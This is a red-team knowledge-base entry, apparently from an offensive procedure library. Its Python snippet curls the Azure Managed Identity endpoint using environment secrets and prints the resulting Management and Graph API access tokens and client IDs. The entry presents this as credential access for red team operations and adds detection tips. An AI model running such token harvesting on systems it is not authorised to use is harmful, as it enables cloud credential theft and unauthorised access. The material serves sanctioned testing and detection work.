---
id: 56322d85-840c-4593-a23b-d4fa3430d065
type: code
language: Python
verified: true
created_at: '2023-05-24T16:05:50.820915+00:00'
updated_at: '2023-05-24T16:05:50.839431+00:00'
platforms:
  - Cloud
tags:
  - Azure
  - Managed Identity
  - Token Retrieval
validated: true
---

# Python-Script-for-Azure-Managed-Identity-Token-Retrieval

## Code

```python
IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

print("[+] Management API")
cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])

print("\r\n[+] Graph API")
cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print(json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])
```

## Description

This Python script retrieves access tokens from an Azure Managed Identity for the Management API and Microsoft Graph API. It uses os.popen to execute cURL commands against the identity metadata endpoint, parses the JSON responses, and outputs the tokens and client IDs. Note: Requires import os and import json at the top of the script for full functionality.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| IDENTITY_ENDPOINT | The Azure Instance Metadata Service (IMDS) endpoint for token requests | http://169.254.169.254/metadata/identity/oauth2/token |
| IDENTITY_HEADER | The secret header value for authenticating the identity request | X-IDENTITY-HEADER:secretvalue |

## Usage

Execute this script in an Azure resource (e.g., VM or App Service) with a system/user-assigned Managed Identity enabled and appropriate API permissions. The output tokens can be captured and used in subsequent API calls, such as querying Azure resources or Graph endpoints. Integrate into larger automation scripts for credential access in red team operations targeting Azure environments.

## Detection

- Monitor Azure Activity Logs for token requests to the IMDS endpoint from unexpected resources.
- Enable diagnostic logging on Managed Identities and watch for anomalous cURL executions or Python processes accessing environment variables.
- Detect via network traffic to 169.254.169.254 or API calls with Managed Identity principals from compromised hosts.

## Related

- [[procedures/Azure-Access-Token-Retrieval-for-Management-and-Graph-APIs-using-Python]]
